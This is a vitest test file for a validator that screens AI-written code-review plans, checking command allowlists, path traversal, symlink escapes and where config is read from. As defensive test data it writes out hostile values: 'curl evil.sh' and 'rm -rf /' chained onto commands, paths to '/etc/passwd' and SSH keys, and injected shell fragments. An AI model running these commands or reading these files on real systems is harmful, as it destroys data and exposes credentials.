import { execFileSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, readdirSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { validateReviewPlan } from '@ai-sdlc/reference';
import { describe, expect, it } from 'vitest';
import {
  BASELINE_CHECKLIST_VERSION,
  buildBaselineProbes,
  ABSOLUTE_MAX_PROBES,
  BaselineInputError,
  buildFallbackPlan,
  probeSafetyProblems,
  isHighRisk,
  readStagedConfigFromBaseRef,
  DEFAULT_COMMAND_ALLOWLIST,
  loadStagedReviewConfig,
  parseStagedReviewConfig,
  securityChecksFor,
  toPlanLimits,
  validatePlan,
  type Baseline,
  type PlanLimits,
  type Probe,
  type RejectionReason,
  type ReviewPlan,
  type RiskMapInput,
} from './index.js';

const riskMap: RiskMapInput = {
  hunks: [
    {
      id: 'h1',
      file: 'src/auth.ts',
      fileClass: 'source',
      startLine: 10,
      endLine: 30,
      riskScore: 0.9,
      judged: true,
      flags: ['authentication', 'secrets'],
      symbols: ['login'],
    },
    {
      id: 'h2',
      file: 'src/util.ts',
      fileClass: 'source',
      startLine: 1,
      endLine: 5,
      riskScore: 0.1,
      judged: true,
      flags: [],
    },
    {
      id: 'h3',
      file: 'src/util.ts',
      fileClass: 'source',
      startLine: 40,
      endLine: 50,
      riskScore: 0.0,
      judged: false,
      flags: [],
    },
  ],
  criteria: [
    { id: 'AC-1', text: 'login works', likelyUncovered: true },
    { id: 'AC-2', text: 'util works', likelyUncovered: false },
  ],
  changedSourceFiles: [
    { path: 'src/util.ts', changedTests: [] },
    { path: 'src/auth.ts', changedTests: ['src/auth.test.ts'] },
  ],
  changedTestFiles: ['src/auth.test.ts'],
  changedFiles: ['src/auth.ts', 'src/util.ts', 'src/auth.test.ts', 'other/x.ts'],
};
const task = { references: ['src/'] };
const limits: PlanLimits = {
  riskThreshold: 0.5,
  maxProbes: 100,
  maxTargetBytes: 100_000,
  commandAllowlist: DEFAULT_COMMAND_ALLOWLIST,
  repoRoot: mkdtempSync(join(tmpdir(), 'rp-root-')),
};
const baseline = (): Baseline =>
  buildBaselineProbes(riskMap, task, {
    riskThreshold: 0.5,
    commandAllowlist: DEFAULT_COMMAND_ALLOWLIST,
  });
const planOf = (probes: Probe[]): ReviewPlan => ({
  schemaVersion: 1,
  baselineVersion: BASELINE_CHECKLIST_VERSION,
  probes,
});
const clone = <T>(v: T): T => JSON.parse(JSON.stringify(v)) as T;
function reasons(
  plan: unknown,
  lim: PlanLimits = limits,
  rm: RiskMapInput = riskMap,
): RejectionReason[] {
  const r = validatePlan(plan, baseline(), rm, lim);
  return r.valid ? [] : r.rejections.map((x) => x.reason);
}

describe('buildBaselineProbes', () => {
  const b = baseline();
  const ids = b.probes.map((p) => p.id);

  it('is versioned, deterministic and all baseline-flagged', () => {
    expect(b.version).toBe(BASELINE_CHECKLIST_VERSION);
    expect(baseline()).toEqual(b);
    expect(b.probes.every((p) => p.baseline === true)).toBe(true);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it('contains every probe class the checklist lists', () => {
    expect(ids.filter((i) => i.startsWith('file-read-'))).toHaveLength(2);
    // h1 (high score) and h3 (unjudged) are high risk; h2 is not.
    expect(
      b.probes
        .filter((p) => p.id.startsWith('hunk-read-'))
        .flatMap((p) => p.covers)
        .sort(),
    ).toEqual(['h1', 'h3']);
    expect(
      b.probes
        .filter((p) => p.id.startsWith('hunk-trace-'))
        .flatMap((p) => p.covers)
        .sort(),
    ).toEqual(['h1', 'h3']);
    const run = b.probes.find((p) => p.id === 'tests-run');
    expect(run?.target.command).toBe('pnpm test');
    expect(b.probes.some((p) => p.id === 'criteria-vs-tests' && p.type === 'compare')).toBe(true);
    expect(ids.filter((i) => i.startsWith('criterion-uncovered-'))).toHaveLength(1);
    expect(b.probes.find((p) => p.id === 'scope-search')?.target.files).toEqual([
      { path: 'other/x.ts' },
    ]);
  });

  it('gives an authentication-flagged hunk the full security probe set', () => {
    const forH1 = b.probes.filter((p) => p.id.startsWith('sec-') && p.covers[0] === 'h1');
    for (const cat of ['authentication', 'secrets'] as const)
      for (const c of securityChecksFor(cat))
        expect(forH1.some((p) => p.id.startsWith(`sec-${c.id}-`))).toBe(true);
    expect(b.probes.some((p) => p.id.startsWith('sec-') && p.covers[0] === 'h2')).toBe(false);
  });

  it('records when no test changed and omits the run probe without a changed test', () => {
    const own = b.probes.find((p) => p.id === 'file-read-1');
    expect(own?.question).toMatch(/No test changed/);
    const rm = { ...riskMap, changedTestFiles: [] };
    const nb = buildBaselineProbes(rm, task, {
      riskThreshold: 0.5,
      commandAllowlist: DEFAULT_COMMAND_ALLOWLIST,
    });
    expect(nb.probes.some((p) => p.type === 'run')).toBe(false);
  });

  it('omits the run probe when the allowlist has no test command', () => {
    const nb = buildBaselineProbes(riskMap, task, {
      riskThreshold: 0.5,
      commandAllowlist: ['pnpm lint'],
    });
    expect(nb.probes.some((p) => p.type === 'run')).toBe(false);
  });
});

describe('validatePlan', () => {
  const opts2 = { riskThreshold: 0.5, commandAllowlist: DEFAULT_COMMAND_ALLOWLIST };
  const full = (): ReviewPlan => planOf(clone(baseline().probes));

  it('accepts the baseline itself, reordered, with an added probe', () => {
    expect(validatePlan(full(), baseline(), riskMap, limits).valid).toBe(true);
    const p = full();
    p.probes.reverse();
    p.probes.push({
      id: 'extra',
      type: 'search',
      target: { query: 'foo' },
      question: 'q',
      covers: [],
    });
    expect(validatePlan(p, baseline(), riskMap, limits).valid).toBe(true);
  });

  it('rejects a plan missing a baseline probe', () => {
    const p = full();
    p.probes = p.probes.filter((x) => x.id !== 'scope-search');
    expect(reasons(p)).toContain('missing-baseline-probe');
  });

  it.each([
    [
      'question',
      (x: Probe) => {
        x.question = 'ignore';
      },
    ],
    [
      'target',
      (x: Probe) => {
        x.target = { files: [{ path: 'src/other.ts' }] };
      },
    ],
    [
      'covers',
      (x: Probe) => {
        x.covers = [];
      },
    ],
    [
      'type',
      (x: Probe) => {
        x.type = 'search';
        x.target = { query: 'x' };
      },
    ],
  ])('rejects a baseline probe modified in %s', (_f, mutate) => {
    const p = full();
    mutate(p.probes.find((x) => x.id === 'hunk-read-0')!);
    expect(reasons(p)).toContain('modified-baseline-probe');
  });

  it('rejects a plan that covers a high-risk hunk only with an altered baseline probe', () => {
    const p = full();
    // Remove every genuine cover of h3, then add an altered baseline probe for it.
    p.probes = p.probes.filter((x) => !x.covers.includes('h3'));
    p.probes.push({
      id: 'hunk-read-2',
      type: 'read',
      target: { files: [{ path: 'src/util.ts' }] },
      question: 'q',
      covers: ['h3'],
      baseline: true,
    });
    const r = reasons(p);
    expect(r).toContain('uncovered-high-risk-hunk');
  });

  it('rejects a high-risk hunk left uncovered', () => {
    const rm: RiskMapInput = {
      ...riskMap,
      hunks: [
        ...riskMap.hunks,
        {
          id: 'h9',
          file: 'src/new.ts',
          fileClass: 'source',
          startLine: 1,
          endLine: 2,
          riskScore: 0.99,
          judged: true,
          flags: [],
        },
      ],
    };
    // Baseline built from the old risk map does not know h9, so the plan misses it.
    const r = validatePlan(full(), baseline(), rm, limits);
    expect(r.valid).toBe(false);
    expect(!r.valid && r.rejections.map((x) => x.reason)).toContain('uncovered-high-risk-hunk');
  });

  it('treats an unjudged hunk as high risk', () => {
    const p = full();
    p.probes = p.probes.filter((x) => !x.covers.includes('h3'));
    expect(reasons(p)).toContain('uncovered-high-risk-hunk');
  });

  const extra = (n: number): Probe[] =>
    Array.from({ length: n }, (_, i) => ({
      id: `add-${i}`,
      type: 'search' as const,
      target: { query: 'x'.repeat(100) },
      question: 'q',
      covers: [],
    }));

  it('measures the probe and size limits against probes the plan adds, not the baseline', () => {
    const baseCount = baseline().probes.length;
    // The baseline alone is larger than both limits and is still accepted.
    expect(
      validatePlan(full(), baseline(), riskMap, { ...limits, maxProbes: 1, maxTargetBytes: 1 })
        .valid,
    ).toBe(true);
    const p = full();
    p.probes.push(...extra(3));
    expect(baseCount).toBeGreaterThan(3);
    expect(reasons(p, { ...limits, maxProbes: 2 })).toContain('probe-limit-exceeded');
    expect(reasons(p, { ...limits, maxProbes: 3 })).not.toContain('probe-limit-exceeded');
    expect(reasons(p, { ...limits, maxTargetBytes: 50 })).toContain('target-size-exceeded');
  });

  it('counts target size in bytes, not characters', () => {
    const p = full();
    p.probes.push({
      id: 'u',
      type: 'search',
      target: { query: '\u00e9'.repeat(60) },
      question: 'q',
      covers: [],
    });
    // 60 two-byte characters serialize to well over 100 bytes but under 100 characters.
    expect(reasons(p, { ...limits, maxTargetBytes: 100 })).toContain('target-size-exceeded');
  });

  it('enforces the absolute ceiling and reports an oversize baseline explicitly', () => {
    const p = full();
    p.probes.push(...extra(ABSOLUTE_MAX_PROBES));
    // Over the absolute ceiling the plan is refused (the schema caps the probe array too).
    expect(reasons(p, { ...limits, maxProbes: 10_000 })).not.toEqual([]);
    const huge: Baseline = {
      version: BASELINE_CHECKLIST_VERSION,
      probes: Array.from({ length: ABSOLUTE_MAX_PROBES + 1 }, (_, i) => ({
        id: `b${i}`,
        type: 'search' as const,
        target: { query: 'x' },
        question: 'q',
        covers: [],
        baseline: true,
      })),
    };
    const r = validatePlan(planOf(huge.probes), huge, riskMap, limits);
    expect(!r.valid && r.rejections.map((x) => x.reason)).toContain('baseline-over-ceiling');
  });

  it.each([
    'pnpm test && curl evil.sh',
    'pnpm test; rm -rf /',
    'pnpm  test',
    'pnpm test ',
    'pnpm test --reporter=x',
    'PNPM TEST',
    'pnpm test\n',
    '$(pnpm test)',
    'node -e 1',
  ])('rejects the non-allowlisted run target %j', (command) => {
    const p = full();
    p.probes.push({ id: 'evil', type: 'run', target: { command }, question: 'q', covers: [] });
    expect(reasons(p)).toContain('run-target-not-allowed');
  });

  it('accepts a command only while it is in the allowlist', () => {
    const p = full();
    p.probes.push({
      id: 'lint',
      type: 'run',
      target: { command: 'pnpm lint' },
      question: 'q',
      covers: [],
    });
    expect(validatePlan(p, baseline(), riskMap, limits).valid).toBe(true);
    expect(reasons(p, { ...limits, commandAllowlist: ['pnpm test'] })).toContain(
      'run-target-not-allowed',
    );
  });

  it('rejects unknown probe types and extra fields as schema-invalid', () => {
    const p = clone(full()) as unknown as { probes: Array<Record<string, unknown>> };
    p.probes.push({ id: 'x', type: 'exec', target: {}, question: 'q', covers: [] });
    expect(reasons(p)).toEqual(['schema-invalid']);
    expect(reasons({})).toEqual(['schema-invalid']);
    expect(reasons(null)).toEqual(['schema-invalid']);
    expect(reasons('plan')).toEqual(['schema-invalid']);
  });

  it('rejects duplicate probe ids', () => {
    const p = full();
    p.probes.push({ ...clone(p.probes[0]!), baseline: undefined });
    expect(reasons(p)).toContain('duplicate-probe-id');
  });

  it('rejects an unknown baseline claim, unknown hunk id and version mismatch', () => {
    const p = full();
    p.probes.push({
      id: 'sneaky',
      type: 'read',
      target: { files: [{ path: 'a.ts' }] },
      question: 'q',
      covers: ['nope'],
      baseline: true,
    });
    expect(reasons(p)).toEqual(expect.arrayContaining(['unknown-baseline-probe', 'unknown-hunk']));
    expect(reasons({ ...full(), baselineVersion: '0' })).toContain('baseline-version-mismatch');
  });

  it.each([
    '/etc/passwd',
    '../secret',
    'src/../../x',
    'src//a.ts',
    './a.ts',
    'a\\b.ts',
    '~/.ssh/id_rsa',
    'C:/x',
    '-rf',
    'a\0b',
    'src/*.ts',
  ])('rejects the unsafe path %j', (path) => {
    const p = full();
    p.probes.push({
      id: 'rd',
      type: 'read',
      target: { files: [{ path }] },
      question: 'q',
      covers: [],
    });
    expect(reasons(p)).toContain('unsafe-path');
  });

  it('rejects a path that resolves through a symlink outside the repo', () => {
    const root = mkdtempSync(join(tmpdir(), 'rp-'));
    const outside = mkdtempSync(join(tmpdir(), 'rp-out-'));
    writeFileSync(join(outside, 'secret'), 'x');
    mkdirSync(join(root, 'src'));
    symlinkSync(outside, join(root, 'src', 'link'));
    const p = full();
    p.probes.push({
      id: 'rd',
      type: 'read',
      target: { files: [{ path: 'src/link/secret' }] },
      question: 'q',
      covers: [],
    });
    expect(reasons(p, { ...limits, repoRoot: root })).toContain('unsafe-path');
    expect(reasons(p)).not.toContain('unsafe-path');
    // A symlinked parent with a missing leaf is still caught.
    p.probes[p.probes.length - 1]!.target = { files: [{ path: 'src/link/missing/deep.ts' }] };
    expect(reasons(p, { ...limits, repoRoot: root })).toContain('unsafe-path');
    // A committed symlink into .git resolves inside the root but is refused.
    mkdirSync(join(root, '.git'));
    mkdirSync(join(root, 'docs'));
    symlinkSync(join(root, '.git'), join(root, 'docs', 'g'));
    p.probes[p.probes.length - 1]!.target = { files: [{ path: 'docs/g/config' }] };
    expect(reasons(p, { ...limits, repoRoot: root })).toContain('unsafe-path');
    // A dangling symlink fails closed.
    symlinkSync('/nonexistent-target-xyz', join(root, 'dangling'));
    p.probes[p.probes.length - 1]!.target = { files: [{ path: 'dangling' }] };
    expect(reasons(p, { ...limits, repoRoot: root })).toContain('unsafe-path');
    // An unresolvable root fails closed.
    expect(reasons(p, { ...limits, repoRoot: join(root, 'no-such-root') })).toContain(
      'unsafe-path',
    );
  });

  it.each(['app/[id]/page.tsx', 'routes/$route.tsx', 'a b/c.ts', "it's/x.ts"])(
    'accepts the legitimate path %j',
    (path) => {
      const p = full();
      p.probes.push({
        id: 'rd',
        type: 'read',
        target: { files: [{ path }] },
        question: 'q',
        covers: [],
      });
      expect(reasons(p)).toEqual([]);
    },
  );

  it('rejects run files that are not changed tests', () => {
    const p = full();
    p.probes.push({
      id: 'rn',
      type: 'run',
      target: { command: 'pnpm lint', files: [{ path: 'src/auth.ts' }] },
      question: 'q',
      covers: [],
    });
    expect(reasons(p)).toContain('run-files-not-changed-tests');
    p.probes[p.probes.length - 1]!.target.files = [{ path: 'src/auth.test.ts' }];
    expect(reasons(p)).toEqual([]);
  });

  it('rejects an unsafe command even when it is in the allowlist, and accepts a safe sibling', () => {
    const allow = ['pnpm test', 'pnpm test; x'];
    const run = (id: string, command: string): Probe => ({
      id,
      type: 'run',
      target: { command },
      question: 'q',
      covers: [],
    });
    const unsafe = full();
    unsafe.probes.push(run('rn', 'pnpm test; x'));
    const r = validatePlan(unsafe, baseline(), riskMap, { ...limits, commandAllowlist: allow });
    expect(!r.valid && r.rejections.map((x) => x.reason)).toContain('run-target-not-allowed');
    const safe = full();
    safe.probes.push(run('rn', 'pnpm lint'));
    expect(
      validatePlan(safe, baseline(), riskMap, {
        ...limits,
        commandAllowlist: [...allow, 'pnpm lint'],
      }).valid,
    ).toBe(true);
  });

  it('rejects inner traversal that stays inside the root, and .git segments', () => {
    for (const path of [
      'src/../other.ts',
      '.git/config',
      '.git./config',
      '.git /config',
      'sub/.git/hooks/x',
      'a/b\u200bc.ts',
      'a\u2060.ts',
      '.GIT/config',
      'a/.Git',
    ]) {
      const p = full();
      p.probes.push({
        id: 'rd',
        type: 'read',
        target: { files: [{ path }] },
        question: 'q',
        covers: [],
      });
      expect(reasons(p), path).toContain('unsafe-path');
    }
    for (const path of ['.github/workflows/ci.yml', 'foo.gitignore', 'src/.gitignore']) {
      const p = full();
      p.probes.push({
        id: 'rd',
        type: 'read',
        target: { files: [{ path }] },
        question: 'q',
        covers: [],
      });
      expect(reasons(p), path).toEqual([]);
    }
  });

  it('rejects a query starting with a dash', () => {
    const probe: Probe = {
      id: 'sq',
      type: 'search',
      target: { query: '--exec=x' },
      question: 'q',
      covers: [],
    };
    expect(probeSafetyProblems(probe, riskMap, limits).map((r) => r.reason)).toEqual([
      'unsafe-query',
    ]);
    const p = full();
    p.probes.push(probe);
    expect(reasons(p)).toEqual(['schema-invalid']);
  });

  it('rejects an identical duplicate plan-added run probe', () => {
    const run = (id: string): Probe => ({
      id,
      type: 'run',
      target: { command: 'pnpm lint' },
      question: 'q',
      covers: [],
    });
    const p = full();
    p.probes.push(run('r1'));
    expect(reasons(p)).toEqual([]);
    p.probes.push(run('r2'));
    expect(reasons(p)).toEqual(['duplicate-run-probe']);
    // Reordered files, a repeated entry and an added line range are all the same run.
    const rm2: RiskMapInput = { ...riskMap, changedTestFiles: ['a.test.ts', 'b.test.ts'] };
    const b2 = buildBaselineProbes(rm2, task, opts2);
    const base2 = planOf(clone(b2.probes));
    const rn = (
      id: string,
      files: Array<{ path: string; startLine?: number; endLine?: number }>,
    ): Probe => ({
      id,
      type: 'run',
      target: { command: 'pnpm lint', files },
      question: 'q',
      covers: [],
    });
    const check = (files: Array<{ path: string; startLine?: number; endLine?: number }>) => {
      const plan = planOf([
        ...clone(base2.probes),
        rn('d1', [{ path: 'a.test.ts' }, { path: 'b.test.ts' }]),
        rn('d2', files),
      ]);
      const r = validatePlan(plan, b2, rm2, limits);
      return r.valid ? [] : r.rejections.map((x) => x.reason);
    };
    expect(check([{ path: 'b.test.ts' }, { path: 'a.test.ts' }])).toEqual(['duplicate-run-probe']);
    expect(check([{ path: 'a.test.ts' }, { path: 'b.test.ts' }, { path: 'a.test.ts' }])).toEqual([
      'duplicate-run-probe',
    ]);
    expect(check([{ path: 'a.test.ts', startLine: 1, endLine: 4 }, { path: 'b.test.ts' }])).toEqual(
      ['duplicate-run-probe'],
    );
    expect(check([{ path: 'a.test.ts' }])).toEqual([]);
    // The baseline test run with files in the opposite order is also a duplicate.
    const swapped = planOf([
      ...clone(base2.probes),
      rn('d3', [{ path: 'b.test.ts' }, { path: 'a.test.ts' }]),
    ]);
    swapped.probes[swapped.probes.length - 1]!.target.command = 'pnpm test';
    const sr = validatePlan(swapped, b2, rm2, limits);
    expect(!sr.valid && sr.rejections.map((x) => x.reason)).toContain('duplicate-run-probe');
    // A copy of the baseline test run is also a duplicate.
    const q = full();
    const b = baseline().probes.find((x) => x.id === 'tests-run')!;
    q.probes.push({ ...clone(b), id: 'tests-run-2', baseline: undefined });
    expect(reasons(q)).toContain('duplicate-run-probe');
  });

  it('rejects an inverted line range', () => {
    const p = full();
    p.probes.push({
      id: 'rd',
      type: 'read',
      target: { files: [{ path: 'a.ts', startLine: 9, endLine: 2 }] },
      question: 'q',
      covers: [],
    });
    expect(reasons(p)).toContain('unsafe-path');
  });
});

describe('buildFallbackPlan', () => {
  const h9 = {
    id: 'h9',
    file: 'src/new.ts',
    fileClass: 'source' as const,
    startLine: 1,
    endLine: 2,
    riskScore: 0.99,
    judged: true,
    flags: [],
  };

  it('is the baseline with no model-authored probe, and passes validation', () => {
    const b = baseline();
    const { ok, plan, rejections } = buildFallbackPlan(b, riskMap, limits);
    expect(ok).toBe(true);
    expect(rejections).toEqual([]);
    expect(plan.probes.filter((p) => p.baseline)).toEqual(b.probes);
    expect(validatePlan(plan, b, riskMap, limits).valid).toBe(true);
  });

  it('adds a read probe per uncovered high-risk hunk', () => {
    const rm: RiskMapInput = { ...riskMap, hunks: [...riskMap.hunks, h9] };
    const b = baseline();
    const { plan } = buildFallbackPlan(b, rm, limits);
    const added = plan.probes.filter((p) => !p.baseline);
    expect(added).toHaveLength(1);
    expect(added[0]).toMatchObject({ type: 'read', covers: ['h9'] });
    expect(added[0]!.id.startsWith('fallback-')).toBe(true);
    expect(validatePlan(plan, b, rm, limits).valid).toBe(true);
  });

  it('drops probes with unsafe or escaping paths and records each drop', () => {
    const root = mkdtempSync(join(tmpdir(), 'rp-fb-'));
    const outside = mkdtempSync(join(tmpdir(), 'rp-fb-out-'));
    symlinkSync(outside, join(root, 'link'));
    const rm: RiskMapInput = {
      ...riskMap,
      hunks: [
        ...riskMap.hunks,
        { ...h9, id: 'hx', file: '../../etc/passwd' },
        { ...h9, id: 'hy', file: 'link/secret.ts' },
      ],
    };
    const b = buildBaselineProbes(rm, task, {
      riskThreshold: 0.5,
      commandAllowlist: DEFAULT_COMMAND_ALLOWLIST,
    });
    const { ok, plan, rejections } = buildFallbackPlan(b, rm, { ...limits, repoRoot: root });
    expect(ok).toBe(false);
    const paths = plan.probes.flatMap((p) => (p.target.files ?? []).map((f) => f.path));
    expect(paths).not.toContain('../../etc/passwd');
    expect(paths).not.toContain('link/secret.ts');
    expect(rejections.filter((r) => r.reason === 'unsafe-path').length).toBeGreaterThan(0);
    expect(rejections.some((r) => r.reason === 'uncovered-high-risk-hunk')).toBe(true);
  });

  it('drops a run probe whose command is no longer allowlisted', () => {
    const b = baseline();
    const { ok, plan, rejections } = buildFallbackPlan(b, riskMap, {
      ...limits,
      commandAllowlist: ['pnpm lint'],
    });
    // The test run is a critical baseline probe, so losing it is not ok.
    expect(ok).toBe(false);
    expect(rejections.map((r) => r.reason)).toContain('critical-baseline-probe-lost');
    expect(plan.probes.some((p) => p.type === 'run')).toBe(false);
    expect(rejections.map((r) => r.reason)).toContain('run-target-not-allowed');
  });

  const lowRisk = (over: Record<string, unknown>) => ({
    id: 'hs',
    file: 'src/safe.ts',
    fileClass: 'source' as const,
    startLine: 1,
    endLine: 3,
    riskScore: 0.01,
    judged: true,
    flags: [] as never[],
    ...over,
  });
  const opts = { riskThreshold: 0.5, commandAllowlist: DEFAULT_COMMAND_ALLOWLIST };

  it('fails when a security-flagged low-risk hunk loses its probes to an unsafe path', () => {
    const rm: RiskMapInput = {
      ...riskMap,
      hunks: [
        lowRisk({ id: 'hs', file: '-evil.ts', flags: ['secrets'] }),
        lowRisk({ id: 'hq', file: 'src/ok.ts' }),
      ],
      changedSourceFiles: [{ path: '-evil.ts', changedTests: [] }],
    };
    const b = buildBaselineProbes(rm, task, opts);
    expect(b.probes.some((p) => p.id.startsWith('sec-'))).toBe(true);
    const r = buildFallbackPlan(b, rm, limits);
    expect(r.ok).toBe(false);
    const lost = r.rejections.filter((x) => x.reason === 'critical-baseline-probe-lost');
    expect(lost.some((x) => x.probeId?.startsWith('sec-'))).toBe(true);
    expect(r.rejections.map((x) => x.reason)).toContain('uncovered-high-risk-hunk');
    expect(r.plan.probes.some((p) => p.covers.includes('hs'))).toBe(false);
  });

  it('strips only the unsafe changed-test ref from tests-run and keeps the probe', () => {
    const rm: RiskMapInput = {
      ...riskMap,
      changedTestFiles: ['src/auth.test.ts', '-bad.test.ts'],
    };
    const b = buildBaselineProbes(rm, task, opts);
    const r = buildFallbackPlan(b, rm, limits);
    const run = r.plan.probes.find((p) => p.id === 'tests-run');
    expect(run?.target.files).toEqual([{ path: 'src/auth.test.ts' }]);
    expect(r.rejections.some((x) => x.probeId === 'tests-run' && x.reason === 'unsafe-path')).toBe(
      true,
    );
    expect(r.rejections.map((x) => x.reason)).not.toContain('critical-baseline-probe-lost');
    expect(r.ok).toBe(true);
  });

  it('is not ok when every target of a critical probe is unsafe', () => {
    const rm: RiskMapInput = { ...riskMap, changedTestFiles: ['-bad.test.ts'] };
    const b = buildBaselineProbes(rm, task, opts);
    const r = buildFallbackPlan(b, rm, limits);
    expect(r.plan.probes.some((p) => p.id === 'tests-run')).toBe(false);
    expect(r.ok).toBe(false);
    expect(
      r.rejections.some(
        (x) => x.reason === 'critical-baseline-probe-lost' && x.probeId === 'tests-run',
      ),
    ).toBe(true);
  });

  it('keeps a probe whose file refs are all stripped when another target remains', () => {
    const rm: RiskMapInput = {
      ...riskMap,
      changedFiles: [...riskMap.changedFiles, '-odd.ts'],
    };
    const b = buildBaselineProbes(rm, task, opts);
    const scope = b.probes.find((p) => p.id === 'scope-search')!;
    expect(scope.target.files?.map((f) => f.path)).toContain('-odd.ts');
    const r = buildFallbackPlan(b, rm, limits);
    const kept = r.plan.probes.find((p) => p.id === 'scope-search');
    expect(kept?.target.files).toEqual([{ path: 'other/x.ts' }]);
    expect(r.ok).toBe(true);
  });

  it('reports a fallback over the absolute ceiling', () => {
    const b: Baseline = {
      version: BASELINE_CHECKLIST_VERSION,
      probes: Array.from({ length: ABSOLUTE_MAX_PROBES + 1 }, (_, i) => ({
        id: `b${i}`,
        type: 'search' as const,
        target: { query: 'x' },
        question: 'q',
        covers: [],
        baseline: true,
      })),
    };
    const { ok, rejections } = buildFallbackPlan(b, { ...riskMap, hunks: [] }, limits);
    expect(ok).toBe(false);
    expect(rejections.map((r) => r.reason)).toContain('baseline-over-ceiling');
  });
});

describe('baseline input hardening', () => {
  const opts = { riskThreshold: 0.5, commandAllowlist: DEFAULT_COMMAND_ALLOWLIST };

  it('produces probes the plan schema accepts', () => {
    const b = baseline();
    const r = validateReviewPlan(planOf(b.probes));
    expect(r.valid).toBe(true);
  });

  it('rejects hunk ids outside the schema and drops symbols outside it', () => {
    const bad = { ...riskMap, hunks: [{ ...riskMap.hunks[0]!, id: 'h 1;rm' }] };
    expect(() => buildBaselineProbes(bad, task, opts)).toThrow(BaselineInputError);
    const syms = {
      ...riskMap,
      hunks: [{ ...riskMap.hunks[0]!, symbols: ['login', 'a b;c', '1bad'] }],
    };
    const b = buildBaselineProbes(syms, task, opts);
    expect(b.probes.find((p) => p.id.startsWith('hunk-trace-'))?.target.symbols).toEqual(['login']);
    expect(validateReviewPlan(planOf(b.probes)).valid).toBe(true);
  });

  it('yields no duplicate probe ids for duplicate flags on one hunk', () => {
    const rm = {
      ...riskMap,
      hunks: [
        {
          ...riskMap.hunks[0]!,
          flags: ['secrets', 'secrets', 'authentication', 'secrets'] as const,
        },
      ],
    };
    const ids = buildBaselineProbes(rm, task, opts).probes.map((p) => p.id);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it('treats a non-finite risk score as high risk', () => {
    const h = { ...riskMap.hunks[1]!, riskScore: Number.NaN };
    expect(isHighRisk(h, 0.5)).toBe(true);
    expect(isHighRisk({ ...h, riskScore: Number.POSITIVE_INFINITY }, 2)).toBe(true);
    expect(isHighRisk({ ...h, riskScore: 0.1 }, 0.5)).toBe(false);
  });
});

describe('staged review config', () => {
  it('uses documented defaults when absent or malformed', () => {
    for (const text of [null, '', ':::not yaml', '- a', 'staged: 3', 'x: 1']) {
      const c = parseStagedReviewConfig(text);
      expect(c.commandAllowlist).toEqual([...DEFAULT_COMMAND_ALLOWLIST]);
      expect(c.riskThreshold).toBe(0.5);
      expect(c.maxProbes).toBe(40);
    }
  });

  it('reads valid values and falls back per field for invalid ones', () => {
    const c = parseStagedReviewConfig(
      'staged:\n  executorCommandAllowlist: ["pnpm test"]\n  riskThreshold: 0.7\n  maxProbes: 9999\n  maxTargetBytes: 500\n',
    );
    expect(c.commandAllowlist).toEqual(['pnpm test']);
    expect(c.riskThreshold).toBe(0.7);
    expect(c.maxProbes).toBe(40);
    expect(c.maxTargetBytes).toBe(500);
  });

  it('falls back to the default allowlist, not a broader one, on unsafe entries', () => {
    const c = parseStagedReviewConfig(
      'staged:\n  executorCommandAllowlist: ["pnpm test", "sh -c \\"x\\"; rm"]\n',
    );
    expect(c.commandAllowlist).toEqual([...DEFAULT_COMMAND_ALLOWLIST]);
    const d = parseStagedReviewConfig('staged:\n  executorCommandAllowlist: pnpm test\n');
    expect(d.commandAllowlist).toEqual([...DEFAULT_COMMAND_ALLOWLIST]);
  });

  it('allows an explicitly empty allowlist', () => {
    expect(
      parseStagedReviewConfig('staged:\n  executorCommandAllowlist: []\n').commandAllowlist,
    ).toEqual([]);
  });

  it('reads only the base ref and ignores a working-tree copy', () => {
    const dir = mkdtempSync(join(tmpdir(), 'rp-git-'));
    const git = (...a: string[]) => execFileSync('git', a, { cwd: dir, stdio: 'ignore' });
    git('init', '-q', '-b', 'main');
    git('config', 'user.email', 't@t');
    git('config', 'user.name', 't');
    git('config', 'commit.gpgsign', 'false');
    mkdirSync(join(dir, '.ai-sdlc'));
    writeFileSync(
      join(dir, '.ai-sdlc', 'review-config.yaml'),
      'staged:\n  executorCommandAllowlist: ["pnpm lint"]\n',
    );
    git('add', '-A');
    git('commit', '-q', '-m', 'base');
    // The working tree tries to widen the allowlist.
    writeFileSync(
      join(dir, '.ai-sdlc', 'review-config.yaml'),
      'staged:\n  executorCommandAllowlist: ["pnpm lint", "pnpm build"]\n  maxProbes: 200\n',
    );
    const c = loadStagedReviewConfig({ workDir: dir, baseRef: 'main' });
    expect(c.commandAllowlist).toEqual(['pnpm lint']);
    expect(c.maxProbes).toBe(40);
    expect(toPlanLimits(c, dir).repoRoot).toBe(dir);
  });

  it('reads the supplied base ref, not HEAD', () => {
    const dir = mkdtempSync(join(tmpdir(), 'rp-git2-'));
    const git = (...a: string[]) => execFileSync('git', a, { cwd: dir, stdio: 'ignore' });
    git('init', '-q', '-b', 'main');
    git('config', 'user.email', 't@t');
    git('config', 'user.name', 't');
    git('config', 'commit.gpgsign', 'false');
    mkdirSync(join(dir, '.ai-sdlc'));
    const cfg = join(dir, '.ai-sdlc', 'review-config.yaml');
    writeFileSync(cfg, 'staged:\n  executorCommandAllowlist: ["pnpm lint"]\n  maxProbes: 7\n');
    git('add', '-A');
    git('commit', '-q', '-m', 'a');
    git('tag', 'older');
    writeFileSync(cfg, 'staged:\n  executorCommandAllowlist: ["pnpm test"]\n  maxProbes: 9\n');
    git('commit', '-q', '-am', 'b');
    const older = loadStagedReviewConfig({ workDir: dir, baseRef: 'older' });
    expect(older.commandAllowlist).toEqual(['pnpm lint']);
    expect(older.maxProbes).toBe(7);
    const head = loadStagedReviewConfig({ workDir: dir, baseRef: 'HEAD' });
    expect(head.commandAllowlist).toEqual(['pnpm test']);
  });

  it('refuses a colon ref that git would otherwise resolve to the index', () => {
    const dir = mkdtempSync(join(tmpdir(), 'rp-git3-'));
    const git = (...a: string[]) => execFileSync('git', a, { cwd: dir, stdio: 'ignore' });
    git('init', '-q', '-b', 'main');
    mkdirSync(join(dir, '.ai-sdlc'));
    writeFileSync(
      join(dir, '.ai-sdlc', 'review-config.yaml'),
      'staged:\n  executorCommandAllowlist: ["pnpm build"]\n',
    );
    // Staged only: ':0:<path>' names the index copy, which a PR controls.
    git('add', '-A');
    const text = execFileSync('git', ['show', ':0:.ai-sdlc/review-config.yaml'], {
      cwd: dir,
      encoding: 'utf8',
    });
